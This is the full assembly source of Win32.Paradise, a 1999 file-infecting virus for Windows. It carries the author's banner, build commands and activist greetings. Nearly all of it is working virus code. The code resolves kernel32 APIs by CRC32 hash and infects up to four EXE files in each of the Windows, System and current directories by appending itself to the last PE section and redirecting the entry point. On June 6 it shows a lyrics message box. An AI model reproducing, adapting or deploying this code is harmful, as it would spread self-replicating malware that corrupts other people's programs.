; [Win32.Paradise] - Bugfixed and improved version of Iced Earth
; Copyright (c) 1999 by Billy Belcebu/iKX
;
;     ??????                    Welcome to another Billy's production.
; ???? ???????   ???            Enjoy this new...
; ????????????????????
; ? ???????????????? ???
;    ? ?????????????   ?
;   ??????? ?? ??????           ??? ??? ????? ??? ??? ??????  ??????
; ???????  ??   ?? ????         ? ??? ? ?? ?? ? ??? ? ??????? ???????
; ? ?      ??      ?            ? ??? ? ?? ?? ? ??? ? ??????? ??????? ???
;         ??                    ??????? ????? ??????? ??????? ??????? ???
;     ??  ???   ??????? ??????? ??????? ??????? ??????  ????? ??????? ???????
;   ??????????? ? ??? ? ? ??? ? ? ??? ? ? ??? ? ? ?? ?? ?? ?? ? ????? ? ?????
; ????? ?? ???? ? ????? ? ??? ? ? ? ??? ? ??? ? ? ??? ? ?? ?? ????? ? ? ?????
;               ???     ??? ??? ??????? ??? ??? ??????? ????? ??????? ???????
;
; Virus Name    : Paradise
; Virus Author  : Billy Belcebu/iKX
; Origin        : Spain
; Platform      : Win32
; Target        : PE files
; Compiling     : TASM 5.0 and TLINK 5.0 should be used
;                       tasm32 /ml /m3 paradise,,;
;                       tlink32 /Tpe /aa /c /v paradise,paradise,,import32.lib,
; Notes         : Not very innovative, just made for practice some things, as
;                 CRC32 GetAPI engine, and such like. The name comes from one
;                 of the best songs i've ever heard, and probably my favouri-
;                 te song of Stratovarius. Its  lyrics are, sadly, an  actual
;                 reality: we are killing the nature  slowly and  without any
;                 kind of mercy, thinking that we can make  any use of every-
;                 thing around without any responsability...
; Greetings     : It is very clear... to all  the Stratovaius fans (specially
;                 to Int13h and Owl) and all the ecologist activists.
; Fucks         : To everything related  to the  bullfights, the greatest act
;                 of  the  human  barbarism with  the  animals, the spanish's
;                 national  shame; and  to  all the acts that go againist the
;                 rights  of the animals  and/or the  vegetables, as  well as
;                 with the persons (goddamn fascisms!).
;
;                               Rojo, sangre
;                          un color muy nacional
;                              morbo, suerte
;                          sol y arena pide Dios
;                               arte, muerte
;                            sirve de alimento
;                              pase, valiente,
;                            y vuelta al ruedo!!!
;                   Cuando el acero me traspasa el corazon
;                            y se le llama fiesta
;                          y otra vuelta de tuerca
;                 cuando el sadismo se convierte en tradicion
;                             y la faena en gesta
;                             y nadie se molesta
;                               -Reincidentes-
;

        .586p
        .model  flat       

; ??----??????                                                              ?
; : Paradise virus - Data, macros and such like shit                        :
; ?                                                              ??????---???

extrn   MessageBoxA:PROC
extrn   ExitProcess:PROC

virus_size      equ     (offset virus_end-offset virus_start)
heap_size       equ     (offset heap_end-offset heap_start)
total_size      equ     virus_size+heap_size
shit_size       equ     (offset delta-offset Paradise)
section_flags   equ     00000020h or 20000000h or 80000000h
temp_attributes equ     00000080h
n_infections    equ     04h

mark            equ     04Ch

; Only hardcoded for 1st generation, don't worry ;)

kernel_         equ     0BFF70000h
kernel_wNT      equ     077F00000h

; Interesting macros for my code

cmp_            macro   reg,joff1               ; Optimized version of
                inc     reg                     ; CMP reg,0FFFFFFFFh
                jz      joff1                   ; JZ  joff1
                dec     reg                     ; The code is reduced in 3 
                endm                            ; bytes (7-4)

apicall         macro   apioff                  ; Optimize muthafucka!
                call    dword ptr [ebp+apioff]
                endm

                .data

szTitle         db      "Paradise v1.00",0

szMessage       db      "Paradise - Visions - Stratovarius",10
                db      "Virus size............"
                db      virus_size/1000 mod 10 + "0"
                db      virus_size/0100 mod 10 + "0"
                db      virus_size/0010 mod 10 + "0"
                db      virus_size/0001 mod 10 + "0"
                db      " bytes",0
                db      "Copyright (c) 1999 by Billy Belcebu/iKX",0

                .code

; ??----??????                                                              ?
; : Paradise virus - Virus startz here                                      :
; ?                                                              ??????---???

virus_start     label   byte

Paradise:
        pushad                                  ; Push all da shit
        pushfd

        call    delta_                          ; Hardest code to undestand ;)
delta:  db      "[iKX4EVER"                     ; Yeah... iKX :)
delta_: pop     ebp
        mov     eax,ebp
        sub     ebp,offset delta

        sub     eax,shit_size                   ; Obtain at runtime the 
        sub     eax,00001000h                   ; imagebase of the process
NewEIP  equ     $-4
        mov     dword ptr [ebp+ModBase],eax     

        call    ChangeSEH                       ; SEH rlz :)
        mov     esp,[esp+08h]
        jmp     RestoreSEH
ChangeSEH:
        xor     ebx,ebx
        push    dword ptr fs:[ebx]
        mov     fs:[ebx],esp              

        mov     esi,[esp+2Ch]                   ; Get program return address
        and     esi,0FFFF0000h                  ; Align to page
        mov     ecx,5
        call    GetK32

        mov     dword ptr [ebp+kernel],eax      ; EAX must be K32 base address

        lea     esi,[ebp+@@NamezCRC32]
        lea     edi,[ebp+@@Offsetz]
        call    GetAPIs                         ; Retrieve all APIs

        call    PrepareInfection
        call    InfectItAll
        call    payload

        or      ebp,ebp                         ; Is 1st gen?
        jz      fakehost

RestoreSEH:
        xor     ebx,ebx
        pop     dword ptr fs:[ebx]
        pop     eax

        popfd
        popad

        mov     ebx,12345678h
        org     $-4
OldEIP  dd      00001000h

        add     ebx,12345678h
        org     $-4
ModBase dd      00400000h

        push    ebx
        ret

; ??----??????                                                              ?
; : Paradise virus - Retrieve directories to infect                         :
; ?                                                              ??????---???

PrepareInfection:
        lea     edi,[ebp+WindowsDir]
        push    7Fh
        push    edi
        apicall _GetWindowsDirectoryA

        add     edi,7Fh
        push    7Fh
        push    edi
        apicall _GetSystemDirectoryA

        add     edi,7Fh
        push    edi
        push    7Fh
        apicall _GetCurrentDirectoryA
        ret

; ??----??????                                                              ?
; : Paradise virus - Infect windows, windows\system and the current dir     :
; ?                                                              ??????---???

InfectItAll:
        lea     edi,[ebp+directories]
        mov     byte ptr [ebp+mirrormirror],dirs2inf
requiem:
        push    edi
        apicall _SetCurrentDirectoryA

        push    edi
        call    Infect
        pop     edi

        add     edi,7Fh

        dec     byte ptr [ebp+mirrormirror]
        cmp     byte ptr [ebp+mirrormirror],00h
        jnz     requiem

        ret

; ??----??????                                                              ?
; : Paradise virus - Searching... Seek and infect!                          :
; ?                                                              ??????---???

Infect: and     dword ptr [ebp+infections],00000000h ; reset countah
        lea     eax,[ebp+offset WIN32_FIND_DATA] ; Find's shit
        push    eax
        lea     eax,[ebp+offset EXE_MASK]
        push    eax

        apicall _FindFirstFileA
        cmp_    eax,FailInfect

        mov     dword ptr [ebp+SearchHandle],eax

__1:    push    dword ptr [ebp+ModBase]
        push    dword ptr [ebp+OldEIP]
        push    dword ptr [ebp+NewEIP]
        
        call    Infection

        pop     dword ptr [ebp+NewEIP]
        pop     dword ptr [ebp+OldEIP]
        pop     dword ptr [ebp+ModBase]

        inc     byte ptr [ebp+infections]
        cmp     byte ptr [ebp+infections],n_infections
        jz      FailInfect

__2:    lea     edi,[ebp+WFD_szFileName]
        mov     ecx,MAX_PATH
        xor     al,al
        rep     stosb

        lea     eax,[ebp+offset WIN32_FIND_DATA]
        push    eax
        push    dword ptr [ebp+SearchHandle]
        apicall _FindNextFileA
        or      eax,eax
        jz      CloseSearchHandle
        jmp     __1

CloseSearchHandle:
        push    dword ptr [ebp+SearchHandle]
        apicall _FindClose

FailInfect:
        ret

; ??----??????                                                              ?
; : Paradise virus - Infect found file                                      :
; ?                                                              ??????---???

Infection:
        lea     esi,[ebp+WFD_szFileName]        ; Get FileName to infect
        push    80h
        push    esi
        apicall _SetFileAttributesA             ; Wipe its attributes

        call    OpenFile                        ; Open it

        cmp_    eax,CantOpen

        mov     dword ptr [ebp+FileHandle],eax

        mov     ecx,dword ptr [ebp+WFD_nFileSizeLow] ; 1st we create map with 
        call    CreateMap                       ; its exact size
        cmp_    eax,CloseFile

        mov     dword ptr [ebp+MapHandle],eax

        mov     ecx,dword ptr [ebp+WFD_nFileSizeLow] 
        call    MapFile                         ; Map it
        cmp_    eax,UnMapFile

        mov     dword ptr [ebp+MapAddress],eax

        mov     esi,eax                         ; Get PE Header
        mov     esi,[esi+3Ch]
        add     esi,eax
        cmp     dword ptr [esi],"EP"            ; Is it PE?
        jnz     NoInfect

        cmp     dword ptr [esi+mark],"SDRP"     ; Was it infected?
        jz      NoInfect

        push    dword ptr [esi+3Ch]

        push    dword ptr [ebp+MapAddress]      ; Close all
        apicall _UnmapViewOfFile

        push    dword ptr [ebp+MapHandle]
        apicall _CloseHandle

        pop     ecx

        mov     eax,dword ptr [ebp+WFD_nFileSizeLow] ; And Map all again.
        add     eax,virus_size

        call    Align
        xchg    ecx,eax

        call    CreateMap
        cmp_    eax,CloseFile

        mov     dword ptr [ebp+MapHandle],eax

        mov     ecx,dword ptr [ebp+NewSize]
        call    MapFile
        cmp_    eax,UnMapFile

        mov     dword ptr [ebp+MapAddress],eax
        
        mov     esi,eax                         ; Get PE Header
        mov     esi,[esi+3Ch]
        add     esi,eax

        mov     edi,esi

        movzx   eax,word ptr [edi+06h]
        dec     eax
        imul    eax,eax,28h
        add     esi,eax
        add     esi,78h
        mov     edx,[edi+74h]
        shl     edx,3
        add     esi,edx

        mov     eax,[edi+28h]
        mov     dword ptr [ebp+OldEIP],eax
        
        mov     edx,[esi+10h]
        mov     ebx,edx
        add     edx,[esi+14h]

        push    edx

        mov     eax,ebx
        add     eax,[esi+0Ch]
        mov     [edi+28h],eax
        mov     dword ptr [ebp+NewEIP],eax

        mov     eax,[esi+10h]
        add     eax,virus_size
        mov     ecx,[edi+3Ch]
        call    Align

        mov     [esi+10h],eax
        mov     [esi+08h],eax

        pop     edx

        mov     eax,[esi+10h]
        add     eax,[esi+0Ch]
        mov     [edi+50h],eax

        or      dword ptr [esi+24h],section_flags
        mov     dword ptr [edi+mark],"SDRP"

        lea     esi,[ebp+Paradise]
        xchg    edi,edx
        add     edi,dword ptr [ebp+MapAddress]
        mov     ecx,virus_size
        rep     movsb

        jmp     UnMapFile

NoInfect:
        dec     byte ptr [ebp+infections]
        mov     ecx,dword ptr [ebp+WFD_nFileSizeLow]
        call    TruncFile

UnMapFile:
        push    dword ptr [ebp+MapAddress]
        apicall _UnmapViewOfFile

CloseMap:
        push    dword ptr [ebp+MapHandle]
        apicall _CloseHandle

CloseFile:
        push    dword ptr [ebp+FileHandle]
        apicall _CloseHandle

CantOpen:
        push    dword ptr [ebp+WFD_dwFileAttributes]
        lea     eax,[ebp+WFD_szFileName]
        push    eax
        apicall _SetFileAttributesA
        ret

; ??----??????                                                              ?
; : Paradise virus - Get KERNEL32.DLL base address (simplest method)        :
; ?                                                              ??????---???

GetK32          proc
_@1:    jecxz   WeFailed
        cmp     word ptr [esi],"ZM"
        jz      CheckPE
_@2:    sub     esi,10000h
        dec     ecx
        jmp     _@1
CheckPE:
        mov     edi,[esi+3Ch]
        add     edi,esi
        cmp     dword ptr [edi],"EP"
        jz      WeGotK32
        jmp     _@2
WeFailed:
        mov     ecx,cs
        xor     cl,cl
        jecxz   WeAreInWNT
        mov     esi,kernel_
        jmp     WeGotK32
WeAreInWNT:
        mov     esi,kernel_wNT
WeGotK32:
        xchg    eax,esi
        ret
GetK32          endp

; ??----??????                                                              ?
; : Paradise virus - Get all API addresses                                  :
; ?                                                              ??????---???

GetAPIs         proc
@@1:    lodsd                                   ; Get in EAX the CRC32 of API
        push    esi
        push    edi
        call    GetAPI_ET_CRC32
        pop     edi
        pop     esi
        stosd                                   ; Save in [EDI] the API address
        cmp     byte ptr [esi],0BBh             ; Last API?
        jz      @@4                             ; Yeah, get outta here
        jmp     @@1                             ; Nein, loop again
@@4:    ret
GetAPIs         endp

GetAPI_ET_CRC32 proc
        xor     edx,edx
        xchg    eax,edx                         ; Put CRC32 of da api in EDX
        mov     word ptr [ebp+Counter],ax       ; Reset counter
        mov     esi,3Ch
        add     esi,[ebp+kernel]                ; Get PE header of KERNEL32
        lodsw
        add     eax,[ebp+kernel]                ; Normalize

        mov     esi,[eax+78h]                   ; Get a pointer to its 
        add     esi,1Ch                         ; Export Table
        add     esi,[ebp+kernel]

        lea     edi,[ebp+AddressTableVA]        ; Pointer to the address table
        lodsd                                   ; Get AddressTable value
        add     eax,[ebp+kernel]                ; Normalize
        stosd                                   ; And store in its variable

        lodsd                                   ; Get NameTable value
        add     eax,[ebp+kernel]                ; Normalize
        push    eax                             ; Put it in stack
        stosd                                   ; Store in its variable

        lodsd                                   ; Get OrdinalTable value
        add     eax,[ebp+kernel]                ; Normalize
        stosd                                   ; Store

        pop     esi                             ; ESI = NameTable VA

@?_3:   push    esi                             ; Save again
        lodsd                                   ; Get pointer to an API name
        add     eax,[ebp+kernel]                ; Normalize
        xchg    edi,eax                         ; Store ptr in EDI
        mov     ebx,edi                         ; And in EBX

        push    edi                             ; Save EDI
        xor     al,al                           ; Reach the null character
        scasb                                   ; that marks us the end of 
        jnz     $-1                             ; the api name
        pop     esi                             ; ESI = Pointer to API Name

        sub     edi,ebx                         ; EDI = API Name size

        push    edx                             ; Save API's CRC32
        call    CRC32                           ; Get actual api's CRC32
        pop     edx                             ; Restore API's CRC32
        cmp     edx,eax                         ; Are them equal?
        jz      @?_4                            ; if yes, we got it

        pop     esi                             ; Restore ptr to api name
        add     esi,4                           ; Get the next
        inc     word ptr [ebp+Counter]          ; And increase the counter
        jmp     @?_3                            ; Get another api!
@?_4:
        pop     esi                             ; Remove shit from stack
        movzx   eax,word ptr [ebp+Counter]      ; AX = Counter
        shl     eax,1                           ; *2 (it's an array of words)
        add     eax,dword ptr [ebp+OrdinalTableVA] ; Normalize
        xor     esi,esi                         ; Clear ESI
        xchg    eax,esi                         ; ESI = Ptr 2 ordinal; EAX = 0
        lodsw                                   ; Get ordinal in AX
        shl     eax,2                           ; And with it we go to the
        add     eax,dword ptr [ebp+AddressTableVA] ; AddressTable (array of
        xchg    esi,eax                         ; dwords)
        lodsd                                   ; Get Address of API RVA
        add     eax,[ebp+kernel]                ; and normalize!! That's it!
        ret
GetAPI_ET_CRC32 endp

; ??----??????                                                              ?
; : Paradise virus - Some useful subroutines                                :
; ?                                                              ??????---???

Align           proc
        push    edx
        xor     edx,edx
        push    eax
        div     ecx
        pop     eax
        sub     ecx,edx
        add     eax,ecx
        pop     edx
        ret
Align           endp

TruncFile       proc
        xor     eax,eax
        push    eax
        push    eax
        push    ecx
        push    dword ptr [ebp+FileHandle]
        apicall _SetFilePointer

        push    dword ptr [ebp+FileHandle]
        apicall _SetEndOfFile
        ret
TruncFile       endp

OpenFile        proc
        xor     eax,eax
        push    eax
        push    eax
        push    00000003h
        push    eax
        inc     eax
        push    eax
        push    80000000h or 40000000h
        push    esi
        apicall _CreateFileA
        ret
OpenFile        endp

CreateMap       proc
        xor     eax,eax
        push    eax
        push    ecx
        push    eax
        push    00000004h
        push    eax
        push    dword ptr [ebp+FileHandle]
        apicall _CreateFileMappingA
        ret
CreateMap       endp

MapFile         proc
        xor     eax,eax
        push    ecx
        push    eax
        push    eax
        push    00000002h
        push    dword ptr [ebp+MapHandle]
        apicall _MapViewOfFile
        ret
MapFile         endp

CRC32           proc
        cld
        xor     ecx,ecx                         ; Optimized by me - 2 bytes
        dec     ecx                             ; less
        mov     edx,ecx
NextByteCRC:
        xor     eax,eax
        xor     ebx,ebx
        lodsb
        xor     al,cl
        mov     cl,ch
        mov     ch,dl
        mov     dl,dh
        mov     dh,8
NextBitCRC:
        shr     bx,1
        rcr     ax,1
        jnc     NoCRC
        xor     ax,08320h
        xor     bx,0EDB8h
NoCRC:  dec     dh
        jnz     NextBitCRC
        xor     ecx,eax
        xor     edx,ebx
        dec     edi                             ; Another fool byte less
        jnz     NextByteCRC
        not     edx
        not     ecx
        mov     eax,edx
        rol     eax,16
        mov     ax,cx
        ret
CRC32           endp

payload         proc
        lea     eax,[ebp+SYSTEMTIME]
        push    eax
        apicall _GetSystemTime

        cmp     word ptr [ebp+ST_wMonth],6      ; On the sixth month...
        jnz     no_payload

        cmp     word ptr [ebp+ST_wDay],6        ; On the sixth day...
        jnz     no_payload

        lea     eax,[ebp+szUSER32]
        push    eax
        apicall _LoadLibraryA

        call    @?_1
        db      "MessageBoxA",0
@?_1:   push    eax
        apicall _GetProcAddress

        push    00001000h
        lea     ebx,[ebp+mark_]
        push    ebx
        lea     ebx,[ebp+song]
        push    ebx
        push    00000000h
        call    eax

no_payload:
        ret
payload         endp

; ??----??????                                                              ?
; : Paradise virus - Virus data                                             :
; ?                                                              ??????---???

mark_   db      "[Win32.Paradise v1.00]",0

song    db      "Late at night i found myself again",10
        db      "wondering and watching TV",10
        db      "I can't believe what's on the screen",10
        db      "something that i wouldn't like to see",10
        db      "Many rare species will perish soon",10
        db      "and we'll be short on food",10
        db      "Why do we have to be so selfish",10
        db      "we have to change our attitude",10
        db      "I know that i am not",10
        db      "the only one that's worried",10
        db      "Why don't we all",10
        db      "wake up, and and realize",10
        db      "Like the birds in the sky",10
        db      "we are flying so high",10
        db      "without making anykind of sacrifice",10
        db      "We've got so little time",10
        db      "to undo this crime",10
        db      "or we'll lose our paradise",10
        db      "It seems to me that there's no sense at all",10
        db      "nobody cares, it's always the same",10
        db      "Mother nature's crying out in pain",10
        db      "I know we are the ones to blame",10,10
        db      "Paradise [ Stratovarius ]",0

        db      "Copyright (c) 1999 by Billy Belcebu/iKX",0

EXE_MASK                db      "*.EXE",0

szUSER32                db      "USER32",0

@@NamezCRC32            label   byte
@FindFirstFileA         dd      0AE17EBEFh
@FindNextFileA          dd      0AA700106h
@FindClose              dd      0C200BE21h
@CreateFileA            dd      08C892DDFh
@DeleteFileA            dd      0DE256FDEh
@SetFilePointer         dd      085859D42h
@SetFileAttributesA     dd      03C19E536h
@CloseHandle            dd      068624A9Dh
@GetCurrentDirectoryA   dd      0EBC6C18Bh
@SetCurrentDirectoryA   dd      0B2DBD7DCh
@GetWindowsDirectoryA   dd      0FE248274h
@GetSystemDirectoryA    dd      0593AE7CEh
@CreateFileMappingA     dd      096B2D96Ch
@MapViewOfFile          dd      0797B49ECh
@UnmapViewOfFile        dd      094524B42h
@SetEndOfFile           dd      059994ED6h
@GetProcAddress         dd      0FFC97C1Fh
@LoadLibraryA           dd      04134D1ADh
@GetSystemTime          dd      075B7EBE8h
                        db      0BBh

                align   dword

virus_end       label   byte

heap_start      label   byte

kernel                  dd      kernel_
infections              dd      00000000h
NewSize                 dd      00000000h
SearchHandle            dd      00000000h
FileHandle              dd      00000000h
MapHandle               dd      00000000h
MapAddress              dd      00000000h
AddressTableVA          dd      00000000h
NameTableVA             dd      00000000h
OrdinalTableVA          dd      00000000h
Counter                 dw      0000h

@@Offsetz               label   byte
_FindFirstFileA         dd      00000000h
_FindNextFileA          dd      00000000h
_FindClose              dd      00000000h
_CreateFileA            dd      00000000h
_DeleteFileA            dd      00000000h
_SetFilePointer         dd      00000000h
_SetFileAttributesA     dd      00000000h
_CloseHandle            dd      00000000h
_GetCurrentDirectoryA   dd      00000000h
_SetCurrentDirectoryA   dd      00000000h
_GetWindowsDirectoryA   dd      00000000h
_GetSystemDirectoryA    dd      00000000h
_CreateFileMappingA     dd      00000000h
_MapViewOfFile          dd      00000000h
_UnmapViewOfFile        dd      00000000h
_SetEndOfFile           dd      00000000h
_GetProcAddress         dd      00000000h
_LoadLibraryA           dd      00000000h
_GetSystemTime          dd      00000000h

MAX_PATH                equ     260

FILETIME                STRUC
FT_dwLowDateTime        dd      ?
FT_dwHighDateTime       dd      ?
FILETIME                ENDS

WIN32_FIND_DATA         label   byte
WFD_dwFileAttributes    dd      ?
WFD_ftCreationTime      FILETIME ?
WFD_ftLastAccessTime    FILETIME ?
WFD_ftLastWriteTime     FILETIME ?
WFD_nFileSizeHigh       dd      ?
WFD_nFileSizeLow        dd      ?
WFD_dwReserved0         dd      ?
WFD_dwReserved1         dd      ?
WFD_szFileName          db      MAX_PATH dup (?)
WFD_szAlternateFileName db      13 dup (?)
                        db      03 dup (?)

directories             label   byte

WindowsDir              db      7Fh dup (00h)
SystemDir               db      7Fh dup (00h)
OriginDir               db      7Fh dup (00h)
dirs2inf                equ     (($-directories)/7Fh)
mirrormirror            db      dirs2inf

SYSTEMTIME              label   byte
ST_wYear                dw      ?
ST_wMonth               dw      ?
ST_wDayOfWeek           dw      ?
ST_wDay                 dw      ?
ST_wHour                dw      ?
ST_wMinute              dw      ?
ST_wSecond              dw      ?
ST_wMilliseconds        dw      ?

heap_end                label   byte

fakehost:
        pop     dword ptr fs:[0]
        pop     eax
        popfd
        popad

        xor     eax,eax
        push    eax
        push    offset szTitle
        push    offset szMessage
        push    eax
        call    MessageBoxA

        push    00000000h
        call    ExitProcess

end     Paradise

; Komandos de autodefensa animal!








